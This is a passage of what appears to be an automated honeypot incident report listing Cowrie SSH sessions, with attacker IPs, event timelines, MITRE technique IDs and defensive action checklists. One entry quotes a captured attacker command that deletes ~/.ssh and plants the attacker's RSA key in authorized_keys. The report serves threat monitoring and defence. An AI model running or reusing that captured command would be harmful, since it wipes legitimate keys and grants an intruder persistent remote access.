| `2026-08-23 09:23:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.17[.]73` to AbuseIPDB if not already reported
- [ ] Block `111.70.17[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba0bebc19baa

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 09:23 |
| **Last Seen** | 2026-08-23 09:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:23:17` | `cowrie.session.connect` |
| `2026-08-23 09:23:17` | `cowrie.client.version` |
| `2026-08-23 09:23:17` | `cowrie.client.kex` |
| `2026-08-23 09:23:18` | `cowrie.login.success` |
| `2026-08-23 09:23:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:23:18` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e4155321826

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:27 |
| **Last Seen** | 2026-08-23 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:27:37` | `cowrie.session.connect` |
| `2026-08-23 09:27:37` | `cowrie.client.version` |
| `2026-08-23 09:27:37` | `cowrie.client.kex` |
| `2026-08-23 09:27:38` | `cowrie.login.success` |
| `2026-08-23 09:27:38` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:27:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:27:38` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ae7436c5b54

| Field | Detail |
|---|---|
| **Source IP** | `83.239.108[.]218` |
| **First Seen** | 2026-08-23 09:27 |
| **Last Seen** | 2026-08-23 09:32 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:27:37` | `cowrie.session.connect` |
| `2026-08-23 09:27:38` | `cowrie.client.version` |
| `2026-08-23 09:27:38` | `cowrie.client.kex` |
| `2026-08-23 09:27:39` | `cowrie.login.success` |
| `2026-08-23 09:27:40` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.108[.]218` to AbuseIPDB if not already reported
- [ ] Block `83.239.108[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53a705469223

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:27 |
| **Last Seen** | 2026-08-23 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:27:41` | `cowrie.session.connect` |
| `2026-08-23 09:27:41` | `cowrie.client.version` |
| `2026-08-23 09:27:41` | `cowrie.client.kex` |
| `2026-08-23 09:27:42` | `cowrie.login.success` |
| `2026-08-23 09:27:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:27:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:27:42` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:27:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af194d88ce30

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-23 09:27 |
| **Last Seen** | 2026-08-23 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:27:41` | `cowrie.session.connect` |
| `2026-08-23 09:27:41` | `cowrie.client.version` |
| `2026-08-23 09:27:41` | `cowrie.client.kex` |
| `2026-08-23 09:27:42` | `cowrie.login.success` |
| `2026-08-23 09:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0588cc9a1e54

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-23 09:27 |
| **Last Seen** | 2026-08-23 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:27:43` | `cowrie.session.connect` |
| `2026-08-23 09:27:43` | `cowrie.client.version` |
| `2026-08-23 09:27:44` | `cowrie.client.kex` |
| `2026-08-23 09:27:44` | `cowrie.login.success` |
| `2026-08-23 09:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498095b9dab9

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]229` |
| **First Seen** | 2026-08-23 09:27 |
| **Last Seen** | 2026-08-23 09:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:27:45` | `cowrie.session.connect` |
| `2026-08-23 09:27:46` | `cowrie.client.version` |
| `2026-08-23 09:27:46` | `cowrie.client.kex` |
| `2026-08-23 09:27:48` | `cowrie.login.success` |
| `2026-08-23 09:27:48` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]229` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3243fad2078e

| Field | Detail |
|---|---|
| **Source IP** | `185.65.134[.]212` |
| **First Seen** | 2026-08-23 09:28 |
| **Last Seen** | 2026-08-23 09:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:28:01` | `cowrie.session.connect` |
| `2026-08-23 09:28:01` | `cowrie.client.version` |
| `2026-08-23 09:28:01` | `cowrie.client.kex` |
| `2026-08-23 09:28:01` | `cowrie.login.success` |
| `2026-08-23 09:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.65.134[.]212` to AbuseIPDB if not already reported
- [ ] Block `185.65.134[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b2c958caba

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-23 09:29 |
| **Last Seen** | 2026-08-23 09:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:29:54` | `cowrie.session.connect` |
| `2026-08-23 09:29:54` | `cowrie.client.version` |
| `2026-08-23 09:29:54` | `cowrie.client.kex` |
| `2026-08-23 09:29:54` | `cowrie.login.success` |
| `2026-08-23 09:29:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c91bafeae893

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-23 09:29 |
| **Last Seen** | 2026-08-23 09:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:29:54` | `cowrie.session.connect` |
| `2026-08-23 09:29:54` | `cowrie.client.version` |
| `2026-08-23 09:29:54` | `cowrie.client.kex` |
| `2026-08-23 09:29:55` | `cowrie.login.success` |
| `2026-08-23 09:29:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6339ff1314c6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-23 09:30 |
| **Last Seen** | 2026-08-23 09:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:30:04` | `cowrie.session.connect` |
| `2026-08-23 09:30:04` | `cowrie.client.version` |
| `2026-08-23 09:30:04` | `cowrie.client.kex` |
| `2026-08-23 09:30:04` | `cowrie.login.success` |
| `2026-08-23 09:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abb3832131e7

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-23 09:30 |
| **Last Seen** | 2026-08-23 09:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:30:05` | `cowrie.session.connect` |
| `2026-08-23 09:30:05` | `cowrie.client.version` |
| `2026-08-23 09:30:05` | `cowrie.client.kex` |
| `2026-08-23 09:30:05` | `cowrie.login.success` |
| `2026-08-23 09:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f8619535a81

| Field | Detail |
|---|---|
| **Source IP** | `2.184.236[.]166` |
| **First Seen** | 2026-08-23 09:32 |
| **Last Seen** | 2026-08-23 09:36 |
| **Session Duration** | 217s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:32:35` | `cowrie.session.connect` |
| `2026-08-23 09:32:36` | `cowrie.client.version` |
| `2026-08-23 09:32:36` | `cowrie.client.kex` |
| `2026-08-23 09:32:38` | `cowrie.login.success` |
| `2026-08-23 09:32:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.184.236[.]166` to AbuseIPDB if not already reported
- [ ] Block `2.184.236[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9a24451466a

| Field | Detail |
|---|---|
| **Source IP** | `24.207.66[.]154` |
| **First Seen** | 2026-08-23 09:32 |
| **Last Seen** | 2026-08-23 09:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:32:43` | `cowrie.session.connect` |
| `2026-08-23 09:32:44` | `cowrie.client.version` |
| `2026-08-23 09:32:44` | `cowrie.client.kex` |
| `2026-08-23 09:32:45` | `cowrie.login.success` |
| `2026-08-23 09:32:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.207.66[.]154` to AbuseIPDB if not already reported
- [ ] Block `24.207.66[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c1a60e58fab

| Field | Detail |
|---|---|
| **Source IP** | `111.46.77[.]2` |
| **First Seen** | 2026-08-23 09:35 |
| **Last Seen** | 2026-08-23 09:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:35:40` | `cowrie.session.connect` |
| `2026-08-23 09:35:41` | `cowrie.client.version` |
| `2026-08-23 09:35:41` | `cowrie.client.kex` |
| `2026-08-23 09:35:43` | `cowrie.login.success` |
| `2026-08-23 09:35:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.46.77[.]2` to AbuseIPDB if not already reported
- [ ] Block `111.46.77[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93e533f87c24

| Field | Detail |
|---|---|
| **Source IP** | `114.111.54[.]189` |
| **First Seen** | 2026-08-23 09:36 |
| **Last Seen** | 2026-08-23 09:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:36:17` | `cowrie.session.connect` |
| `2026-08-23 09:36:17` | `cowrie.client.version` |
| `2026-08-23 09:36:17` | `cowrie.client.kex` |
| `2026-08-23 09:36:18` | `cowrie.login.success` |
| `2026-08-23 09:36:19` | `cowrie.session.params` |
| `2026-08-23 09:36:19` | `cowrie.command.input` |
| `2026-08-23 09:36:19` | `cowrie.command.failed` |
| `2026-08-23 09:36:19` | `cowrie.log.closed` |
| `2026-08-23 09:36:20` | `cowrie.session.params` |
| `2026-08-23 09:36:20` | `cowrie.command.input` |
| `2026-08-23 09:36:20` | `cowrie.session.file_download` |
| `2026-08-23 09:36:20` | `cowrie.log.closed` |
| `2026-08-23 09:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.54[.]189` to AbuseIPDB if not already reported
- [ ] Block `114.111.54[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f950f7009b1

| Field | Detail |
|---|---|
| **Source IP** | `114.111.54[.]189` |
| **First Seen** | 2026-08-23 09:36 |
| **Last Seen** | 2026-08-23 09:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:36:21` | `cowrie.session.connect` |
| `2026-08-23 09:36:21` | `cowrie.client.version` |
| `2026-08-23 09:36:21` | `cowrie.client.kex` |
| `2026-08-23 09:36:22` | `cowrie.login.success` |
| `2026-08-23 09:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.54[.]189` to AbuseIPDB if not already reported
- [ ] Block `114.111.54[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae791e35ed9b

| Field | Detail |
|---|---|
| **Source IP** | `114.111.54[.]189` |
| **First Seen** | 2026-08-23 09:36 |
| **Last Seen** | 2026-08-23 09:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:36:22` | `cowrie.session.connect` |
| `2026-08-23 09:36:22` | `cowrie.client.version` |
| `2026-08-23 09:36:22` | `cowrie.client.kex` |
| `2026-08-23 09:36:23` | `cowrie.login.success` |
| `2026-08-23 09:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.54[.]189` to AbuseIPDB if not already reported
- [ ] Block `114.111.54[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89ad4f6e30a4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:37 |
| **Last Seen** | 2026-08-23 09:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:37:15` | `cowrie.session.connect` |
| `2026-08-23 09:37:15` | `cowrie.client.version` |
| `2026-08-23 09:37:17` | `cowrie.client.kex` |
| `2026-08-23 09:37:18` | `cowrie.login.success` |
| `2026-08-23 09:37:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:37:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:37:18` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a97ef60fca4a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:37 |
| **Last Seen** | 2026-08-23 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:37:19` | `cowrie.session.connect` |
| `2026-08-23 09:37:19` | `cowrie.client.version` |
| `2026-08-23 09:37:19` | `cowrie.client.kex` |
| `2026-08-23 09:37:20` | `cowrie.login.success` |
| `2026-08-23 09:37:20` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:37:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:37:20` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3abbda85c19c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:46 |
| **Last Seen** | 2026-08-23 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:46:45` | `cowrie.session.connect` |
| `2026-08-23 09:46:45` | `cowrie.client.version` |
| `2026-08-23 09:46:45` | `cowrie.client.kex` |
| `2026-08-23 09:46:46` | `cowrie.login.success` |
| `2026-08-23 09:46:46` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:46:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:46:46` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00612d856c38

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:46 |
| **Last Seen** | 2026-08-23 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:46:49` | `cowrie.session.connect` |
| `2026-08-23 09:46:49` | `cowrie.client.version` |
| `2026-08-23 09:46:49` | `cowrie.client.kex` |
| `2026-08-23 09:46:50` | `cowrie.login.success` |
| `2026-08-23 09:46:50` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:46:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:46:50` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8a2c92b996

| Field | Detail |
|---|---|
| **Source IP** | `217.60.33[.]67` |
| **First Seen** | 2026-08-23 09:55 |
| **Last Seen** | 2026-08-23 09:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:55:19` | `cowrie.session.connect` |
| `2026-08-23 09:55:19` | `cowrie.client.version` |
| `2026-08-23 09:55:19` | `cowrie.client.kex` |
| `2026-08-23 09:55:20` | `cowrie.login.success` |
| `2026-08-23 09:55:20` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.33[.]67` to AbuseIPDB if not already reported
- [ ] Block `217.60.33[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1e06eaaf395

| Field | Detail |
|---|---|
| **Source IP** | `183.167.234[.]154` |
| **First Seen** | 2026-08-23 09:55 |
| **Last Seen** | 2026-08-23 09:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:55:25` | `cowrie.session.connect` |
| `2026-08-23 09:55:26` | `cowrie.client.version` |
| `2026-08-23 09:55:26` | `cowrie.client.kex` |
| `2026-08-23 09:55:28` | `cowrie.login.success` |
| `2026-08-23 09:55:28` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.234[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.167.234[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb24b32edd3e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:56 |
| **Last Seen** | 2026-08-23 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:56:33` | `cowrie.session.connect` |
| `2026-08-23 09:56:33` | `cowrie.client.version` |
| `2026-08-23 09:56:33` | `cowrie.client.kex` |
| `2026-08-23 09:56:34` | `cowrie.login.success` |
| `2026-08-23 09:56:34` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:56:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:56:34` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bb64fba6e39

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:56 |
